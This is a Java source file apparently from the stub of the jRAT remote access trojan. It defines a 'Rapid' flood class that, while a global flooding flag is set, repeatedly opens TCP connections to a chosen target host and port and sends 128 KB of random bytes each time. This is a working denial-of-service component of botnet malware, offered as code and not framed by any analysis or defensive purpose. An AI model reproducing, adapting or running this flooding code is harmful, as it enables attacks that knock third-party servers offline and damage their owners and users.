package pro.jrat.stub.flood;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.Random;

import pro.jrat.stub.Constants;

public class Rapid implements Runnable {

	public String target;
	public int port;

	public Rapid(String t, int p) {
		target = t;
		port = p;
	}

	@SuppressWarnings("resource")
	public void run() {
		Random random = new Random();
		byte[] buffer = new byte[1024 * 128];

		while (Constants.flooding) {
			try {
				Socket sock = new Socket(target, port);
				BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));

				random.nextBytes(buffer);

				sock.getOutputStream().write(buffer);

				in.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
